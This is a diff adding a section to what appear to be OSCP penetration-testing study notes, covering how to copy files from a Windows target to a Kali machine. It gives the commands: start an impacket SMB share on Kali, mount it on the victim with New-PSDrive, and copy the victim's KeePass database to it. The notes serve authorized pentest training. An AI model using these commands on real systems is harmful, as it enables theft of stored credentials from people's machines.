@@ -124,3 +124,23 @@ if certutil is available:
 if neither is an option, echo this script into a new file:
 
 [https://github.com/foxed/oscp-notes/blob/add-notes/scripts/wget.vbs]
+
+**transferring files from windows target to kali**
+
+if smb is enabled on the victim machine, we can use impacket's smbserver.py
+
+On kali:
+
+cd /opt/impacket/examples
+
+`./smbserver Heyo `pwd` `
+
+here we start up a share called 'Heyo'
+
+you need to use tickmarks with the pwd
+
+on windows (our target/victim):
+
+`New-PSDrive -Name "Neigh" -PSProvider "FileSystem" -Root "\\my.kali.ip\Heyo" `
+`cd Neigh`
+`PS Neigh:\> cp C:\Users\victim\Documents\CEH.kdbx .`
